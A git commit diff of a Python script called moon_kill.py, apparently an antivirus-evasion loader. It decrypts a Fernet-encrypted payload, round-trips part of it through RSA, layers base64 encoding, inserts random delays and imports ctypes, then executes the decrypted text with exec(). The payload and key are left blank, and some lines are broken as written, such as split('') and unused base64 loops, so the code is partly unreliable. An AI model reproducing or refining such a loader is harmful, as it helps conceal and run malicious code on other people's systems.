1e445d6b9bc10b3778afbdc07bbff952ad27ac2d
Soufaker <44189635+Soufaker@users.noreply.github.com>
2023-09-26 15:52:06 +0800

    update

--- moon_kill.py
+++ moon_kill.py
@@ -1,12 +1,26 @@
 import base64
 import time
 import random
-import ctypes
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa
+import ctypes
+
+
+def base64_encode(original_message):
+    random_int = random.randint(1, 10)
+    ran_num = random.randint(1, 10)
+    for i in range(1, random_int):
+        load = str(base64.b64encode(original_message.encode('UTF-8')), 'UTF-8')
+
+    return load, random_int
+
+def base64_decode(msg,mn):
+    for i in range(1,mn):
+        load = base64.b64decode(msg)
+    return load
 
 # 生成私钥
 private_key = rsa.generate_private_key(
@@ -29,16 +43,6 @@ def encrypt(message):
     )
     return encrypted
 
-enc_pay=b'XXX'
-
-key = b'XXX'
-
-f1 = Fernet(key)
-a = f1.decrypt(enc_pay)
-msg_list = a.decode().split('XXX')
-msg1 = msg_list[0]
-msg2 = msg_list[1]
-msg = encrypt(msg2)
 # 私钥解密
 def decrypt(encrypted):
     original_message = private_key.decrypt(
@@ -50,19 +54,20 @@ def decrypt(encrypted):
         )
     )
     return original_message
-time.sleep(0.1)
-original_message_1 = decrypt(msg).decode('utf-8')
-original_message = msg1+'\n'+decrypt(msg).decode('utf-8')
-#print(original_message)
-load = str(base64.b64encode(original_message.encode('UTF-8')), 'UTF-8')
-random_int = random.randint(1,10)
-ran_num = random.randint(1,10)
-ranStr = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], ran_num))
-print(ranStr)
-for i in range(1,random_int):
-    load = str(base64.b64encode(original_message.encode('UTF-8')), 'UTF-8')
-for i in range(random_int):
-    moon_load=base64.b64decode(load)
-time.sleep(random_int*0.1)
-moon_start=moon_load
-exec(moon_start)
+
+pay=b''
+key=b''
+f1 = Fernet(key)
+f2 = f1.decrypt(pay)
+msg_list = f2.decode().split('')
+msg1 = msg_list[0]
+msg2 = msg_list[1]
+msg = encrypt(msg2)
+ori_msg_1 = decrypt(msg).decode('utf-8')
+ori_msg = msg1+'\n'+decrypt(msg).decode('utf-8')
+print(type(ori_msg))
+load,ln = base64_encode(ori_msg)
+load2 = base64_decode(load,ln)
+print(ori_msg)
+exec(ori_msg)
+print('1')
